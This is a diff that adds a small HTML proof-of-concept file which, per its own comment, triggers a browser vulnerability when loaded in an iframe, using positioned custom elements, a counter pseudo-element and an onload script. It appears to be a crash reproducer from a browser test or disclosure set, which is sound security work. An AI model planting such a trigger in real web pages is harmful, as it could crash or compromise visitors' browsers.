@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<!-- This file must be loaded inside an iframe in another web-page to trigger the vulnerability. -->
+<html>
+  <head>
+    <style>
+      oElement1 {
+        position: absolute;
+      }
+      oElement2:after {
+        position: relative;
+        content: counter(x);
+      }
+    </style>
+    <script>
+      onload = function () {
+        oElement1 = document.createElement('oElement1');
+        document.documentElement.appendChild(oElement1);
+        oElement2 = document.createElement('oElement2');
+        document.documentElement.appendChild(oElement2);
+      };
+    </script>
+  </head>
+</html>
